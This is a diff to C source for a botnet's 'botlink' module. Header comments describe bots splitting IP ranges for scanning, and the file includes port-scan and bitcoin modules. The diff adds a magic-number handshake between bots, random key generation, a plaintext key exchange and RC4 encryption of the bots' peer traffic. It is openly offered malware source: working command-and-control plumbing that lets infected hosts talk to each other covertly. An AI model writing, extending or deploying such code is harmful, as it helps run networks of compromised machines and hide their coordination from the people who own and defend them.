@@ -29,6 +29,7 @@ ip generate seed can be used to ensure different bots scan different IPs
 #include "utils.h"
 #include "botlink.h"
 #include "portscan.h"
+#include <rc4.h>
 // for reusing bitcon's node connection function
 #include "modules/bitcoin/note_bitcoin.h"
 
@@ -38,9 +39,9 @@ ip generate seed can be used to ensure different bots scan different IPs
 
 // various states of bot communication
 enum {
-    BOT_NEW=TCP_NEW,
-    BOT_HANDSHAKE=4,
-    BOT_KEY_EXCHANGE=8,
+    BOT_HANDSHAKE_IN=TCP_CONNECTED,
+    BOT_HANDSHAKE_OUT=APP_HANDSHAKE,
+    BOT_KEY_EXCHANGE=4096,
     BOT_PERFECT=STATE_OK
 };
 
@@ -75,8 +76,17 @@ typedef struct _bot_variables {
     int state;
     
     // encryption key
-    char *key;
-    int key_size;
+    char *key_in;
+    char *key_out;
+    int key_size_in;
+    int key_size_out;
+    rc4_key rc4_iv_in;
+    rc4_key rc4_iv_out;
+    
+    // when we change keys.. this should be flagged
+    // so after the CHOP we process all incoming data
+    // with the new encryption key
+    int crypt_sync;
     
     // bot ID & size
     char *bot_id;
@@ -157,9 +167,11 @@ int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
 // will handle encryption for talking to other bots
 int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size) {
     BotVariables *vars = BotVars(cptr);
-    if (!vars || vars->key_size == 0) return *size;
+    //if (!vars || vars->key_size == 0) return *size;
     
+    if (!stateOK(cptr)) return *size;
     // perform encryption
+    rc4((unsigned char *)*buf, *size, &vars->rc4_iv_out);
     
     return *size;
 }
@@ -167,9 +179,12 @@ int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size) {
 // will handle decryption for communication with other bots
 int botlink_read(Modules *mptr, Connection *cptr, char **buf, int *size) {
     BotVariables *vars = BotVars(cptr);
-    if (!vars || vars->key_size == 0) return *size;
+    //if (!vars || vars->key_size == 0) return *size;
+
+    if (!stateOK(cptr)) return *size;
     
     // perform decryption
+    rc4((unsigned char *)*buf, *size, &vars->rc4_iv_in);
     
     return *size;
 }
@@ -184,13 +199,14 @@ int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
         int state;
         module_func function;    
     } BotlinkParsers[] = {
-        { BOT_NEW, &botlink_new },
-        { BOT_HANDSHAKE, &botlink_new },
+        { BOT_HANDSHAKE_OUT, &botlink_handshake },
+        { BOT_HANDSHAKE_IN, &botlink_handshake },
         { BOT_KEY_EXCHANGE, &botlink_keyexchange },
         { BOT_PERFECT, &botlink_message },
         { 0, NULL }
     };
     BotMSGHdr *_hdr = (BotMSGHdr *)buf;
+    Queue *qptr = NULL;
     
     // ensure we have bot variables.. if not we wanna kill it
     if (vars == NULL) return ret;
@@ -215,29 +231,172 @@ int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
     // a subsequent command was merged
     QueueChopBuf(cptr, buf, sizeof(BotMSGHdr) + _hdr->len);
 
+    // now if we toggled cryptography.. lets apply it to all current incoming packets
+    // its possible our module is slower than the remote side sending messages
+    if (vars->crypt_sync) {
+        vars->crypt_sync = 0;
+                
+        qptr = cptr->incoming;
+        while (qptr != NULL) {
+            
+            rc4((unsigned char *)qptr->buf, qptr->size, &vars->rc4_iv_in);
+            
+            qptr = qptr->next;
+        }
+    }
+    
     // we dont need the message anymore..
     return ret;
+}
+
+
+int bot_pushmagic(Modules *mptr, Connection *cptr) {
+    char vbuf[16];
+    char *sptr = (char *)&vbuf;
+
+    put_int32(&sptr, BOT_MAGIC);
+    
+    return QueueAdd(mptr, cptr, NULL, vbuf, sizeof(int32_t));
+}
+
+int bot_checkmagic(char *buf, int size) {
+    int32_t magic = 0;
+    
+    // we are expecting the bot magic here..
+    // we return 0 so that the message doesnt get removed..
+    // we will wait for it to be at least the space required..
+    if (size < sizeof(int32_t)) return 0;
+    
+    char *sptr = (char *)buf;
+    magic = get_int32(&sptr);
+    
+    // ensure the bot magic is correct (like a handshake)
+    if (magic != BOT_MAGIC) return -1;
+
+    return 1;    
+}
+
+int bot_sendkey(Modules *mptr, Connection *cptr) {
+    BotVariables *vars = BotVars(cptr);
+    char *key = NULL;
+    int key_size = 0;
+    int i = 0;
+    char *keybuf = NULL;
+    int key_pkt_size = 0;
+    char *sptr = NULL;
+    
+    // first generate a key
+    key_size = 16 + rand()%32;
+    key = (char *)malloc(key_size + 1);
+    if (key == NULL) {
+        ConnectionBad(cptr);
+        return -1;
+    }
+    
+    for (i = 0; i < key_size; i++)
+        key[i] = rand()%255;
+    
+    // set it up in outgoing key structure..
+    vars->key_out = key;
+    vars->key_size_out = key_size;
+    
+    // prepare rc4 iv (change to rc6, etc later)
+    prepare_key((unsigned char *)vars->key_out, vars->key_size_out, &vars->rc4_iv_out);
+    
+    // build packet to give key to other side
+    key_pkt_size = sizeof(int32_t) + key_size;
+    
+    if ((keybuf = (char *)malloc(key_pkt_size + 1)) == NULL)
+        return -1;
+        
+    // build final packet..
+    sptr = (char *)keybuf;
+    put_int32(&sptr, key_size);
+    memcpy(sptr, key, key_size);
+    
+    // queue it..
+    i = QueueAdd(mptr, cptr, NULL, keybuf, key_pkt_size);
+    
+    // free temp key pkt from memory here..
+    memset(keybuf, 0, key_pkt_size);
+    free(keybuf);
+    // return queueadd response
+    return i;
 }
 
 // whenever we connect to another bot
 // needs to initiate handshake, etc
 int botlink_connect(Modules *mptr, Connection *cptr, char *buf, int size) {
     BotVariables *vars = BotVars(cptr);
-    if (vars != NULL) {
-        
+    
+    if (vars == NULL) {
+        ConnectionBad(cptr);
+        return 1;
     }
-    return 1;
+
+    bot_pushmagic(mptr, cptr); 
+    
+    cptr->state = BOT_HANDSHAKE_OUT;   
+    
+    // we want it to continue and process the outgoing queue after.. so return 0
+    return 0;
 }
 
 
-int botlink_new(Modules *mptr, Connection *cptr, char *buf, int size) {
+int botlink_handshake(Modules *mptr, Connection *cptr, char *buf, int size) {
     BotVariables *vars = BotVars(cptr);
+    int32_t magic = 0;
+    
+    // we are expecting the bot magic here..
+    // we return 0 so that the message doesnt get removed..
+    // we will wait for it to be at least the space required..
+    if (size < sizeof(int32_t)) return 0;
+    
+    char *sptr = (char *)buf;
+    magic = get_int32(&sptr);
+    
+    // ensure the bot magic is correct (like a handshake)
+    if (magic != BOT_MAGIC) return -1;
+    
+    if (cptr->state != BOT_HANDSHAKE_OUT)
+        bot_pushmagic(mptr, cptr);
+    
+    // if that was fine.. now we want to send over an encryption key
+    // and we expect an encryption key from the other side..
+    cptr->state = BOT_KEY_EXCHANGE;
+    
+    if (bot_sendkey(mptr, cptr) == -1) return -1;
     
     return 1;
 }
 
 int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
     BotVariables *vars = BotVars(cptr);
+    int key_size = 0;
+    char *ptr = (char *)buf;
+    // ensure it has the size of the key   
+    if (size < sizeof(int32_t)) return 0;
+    // get the size of the key
+    key_size = get_int32(&ptr);
+    // ensure it has the entire key in the queue fragment    
+    if (size < (sizeof(int32_t) + key_size)) return 0;
+    // allocate space for the key
+    if ((vars->key_in = (char *)malloc(key_size + 1)) == NULL) {
+        // if that failed.. return 0.. maybe something fixes itself for next round
+        return 0;
+    }
+    
+    // copy key & state size in connection instructions
+    memcpy(vars->key_in, ptr, key_size);    
+    vars->key_size_in = key_size;
+    // use rc4 function to initialize the key & key structure    
+    prepare_key((unsigned char *)vars->key_in, vars->key_size_in, &vars->rc4_iv_in);
+    
+    // let the incoming func know we toggled encryption so a desync doesnt happen
+    vars->crypt_sync = 1;
+    
+    // set state to perform a normal connection
+    cptr->state = BOT_PERFECT;
     
     return 1;
 }
